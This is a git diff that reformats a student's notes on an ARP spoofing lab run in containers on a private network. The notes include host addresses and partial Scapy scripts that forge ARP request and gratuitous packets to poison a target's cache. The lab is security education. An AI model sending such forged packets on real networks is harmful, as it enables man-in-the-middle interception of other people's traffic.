@@ -1,4 +1,7 @@
-Setup:
+# Layer 2 - ARP Attacks
+
+
+## Setup:
 
 No acces to GUI -> Send file from local machine to VM
 
@@ -12,21 +15,25 @@ Logging into all three containers
 finding out Mac-Adress via: ipconfig
 Mac Address and IPs
 
-IP Address
- 
+IP Addresses:
+```
 A: 10.9.0.5
 B: 10.9.0.6
 M: 10.9.0.105
- 
- MAC Adress
+``` 
 
+MAC Addresses:
+```
 A: 02:42:0a:09:00:05
 B: 02:42:0a:09:00:06
 M: 02:42:0a:09:00:69
+```
 
-Task 1.A (using ARP request). On host M, construct an ARP request packet to map B’s IP address
+### Task 1.A (using ARP request)
+On host M, construct an ARP request packet to map B’s IP address
 to M’s MAC address. Send the packet to A and check whether the attack is successful or not.
 
+``` python 
 #!/usr/bin/env python3
 from scapy.all import *
  
@@ -45,17 +52,20 @@ A.pdst  = "10.9.0.5"            #A IP address
  
 pkt = E/A
 sendp(pkt)
+```
 
 ![alt text](image-1.png)
 
 
 
-Task 1.B (using ARP reply). On host M, construct an ARP reply packet to map B’s IP address to
+### Task 1.B (using ARP reply) 
+On host M, construct an ARP reply packet to map B’s IP address to
 M’s MAC address. Send the packet to A and check whether the attack is successful or not.
 
 
 
-Task 1.C (using ARP gratuitous message). On host M, construct an ARP gratuitous packet, and use
+### Task 1.C (using ARP gratuitous message)
+On host M, construct an ARP gratuitous packet, and use
 it to map B’s IP address to M’s MAC address. Please launch the attack under the same two scenarios
 as those described in Task 1.B.
 ARP gratuitous packet is a special ARP request packet. It is used when a host machine needs to
@@ -67,7 +77,7 @@ issuing the gratuitous ARP.
 address (ff:ff:ff:ff:ff:ff).
 – No reply is expected.
 
-
+``` python
 #!/usr/bin/env python3
 from scapy.all import *
  
@@ -86,4 +96,4 @@ A.pdst  = "10.9.0.6"            #A IP address
  
 pkt = E/A
 sendp(pkt)
-
+```
